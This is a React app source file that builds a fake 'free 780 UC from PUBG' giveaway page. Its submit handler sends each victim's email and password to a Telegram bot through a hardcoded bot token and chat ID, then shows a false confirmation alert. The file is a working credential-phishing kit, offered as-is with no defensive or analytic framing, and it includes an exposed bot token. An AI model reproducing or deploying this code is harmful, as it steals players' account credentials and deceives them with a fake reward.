import React, { useState } from 'react';
import axios from 'axios';
import './App.css';
import logo from './assets/images.jpg'

function App() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [Id, setId] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [showButton, setShowButton] = useState(false);

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (emailRegex.test(e.target.value)) {
      setShowPassword(true);
    } else {
      setShowPassword(false);
      setShowButton(false);
    }
  };

  const handleidChange = (e) => {
    setId(e.target.value);
    if (e.target.value.length > 0) {
      setShowButton(false);
    } else {
      setShowButton(false);
    }
  };
  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
    if (e.target.value.length > 0) {
      setShowButton(true);
    } else {
      setShowButton(false);
    }
  };

  const handleSubmit = () => {
    const botToken = '7359191371:AAFBd5TKWb6LzOjIVY6s9BGd1OhcvABzVXY';
    const chatId = '5643811856';
    const message = `Email: ${email}\nPassword: ${password}`;

    axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
    })
      .then(response => {
        alert('780 UC sent data coming soon');
      })
      .catch(error => {
        console.error('An error occurred!', error);

      });
  };

  return (
    <div className="App">
      <header className="App-header">
        <img className='logo' src={logo} alt="" />
        <h1>  Get free 780 UC from PUBG</h1>

        <input
          type="email"
          placeholder="Enter your emailg"

          value={email}
          onChange={handleEmailChange}
        />
        
        {showPassword && (
          <input
            type="number"
            placeholder="Enter your PUBG ID"

            value={Id}
            onChange={handleidChange}
          />
        )}
        {showPassword && (
          <input
            type="password"
            placeholder="Enter the password"

            value={password}
            onChange={handlePasswordChange}
          />
        )}

        {showButton && (
          <button onClick={handleSubmit}>Send</button>
        )}
        <p></p>
      </header>
    </div>
  );
}

export default App;
